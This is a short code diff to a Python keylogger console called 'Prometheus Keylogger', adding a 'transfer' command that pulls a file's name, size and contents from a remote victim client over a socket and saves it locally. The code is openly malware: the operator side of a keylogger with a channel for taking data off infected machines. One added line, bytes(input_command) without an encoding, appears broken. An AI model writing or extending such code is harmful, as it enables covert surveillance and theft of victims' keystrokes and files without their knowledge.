@@ -55,8 +55,13 @@ class OnlineKeylogger:
             input_command = input(
                 Colors.white + "[" + Colors.blue + "Prometheus Keylogger" + Colors.white + "]" + " > ")
             if input_command == "transfer":
-                self.send(input_command, self._ENCODING_FORMAT)
-                file_exists = self.recv(self._DEFAULT_SIZE, self._ENCODING_FORMAT)
+                self.send(bytes(input_command), self._ENCODING_FORMAT)
+                filename = self.recv(self._DEFAULT_SIZE, self._ENCODING_FORMAT)
+                filesize = self.recv(self._DEFAULT_SIZE, self._ENCODING_FORMAT)
+                filedata = self.client.recv(int(filesize))
+                with open(filename, "wb") as file:
+                    file.write(filedata)
+
 
             if input_command == "upload file":
                 pass
